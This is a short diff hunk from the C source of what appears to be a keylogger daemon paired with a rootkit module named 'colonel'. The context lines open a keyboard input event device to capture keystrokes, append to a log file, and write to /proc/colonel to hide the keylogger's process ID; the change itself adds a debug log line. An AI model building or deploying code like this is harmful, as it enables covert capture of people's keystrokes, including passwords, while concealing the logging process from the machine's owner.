@@ -59,7 +59,7 @@ int main(void) {
 	fp = fopen("./col_log/log.txt", "a+"); 					                       /* daemon log */
 	fd = open("/dev/input/event2", O_RDONLY);			                           /* key event file */
 	ftty = open("/proc/colonel", O_WRONLY);					/* open for write to hide keylogger pid */
-
+    fprintf(fp, "I'M AWAKE!!! -- listening: %d, toggle: %s", listening, toggle);
 	time_t curtime;
 	time(&curtime);
 
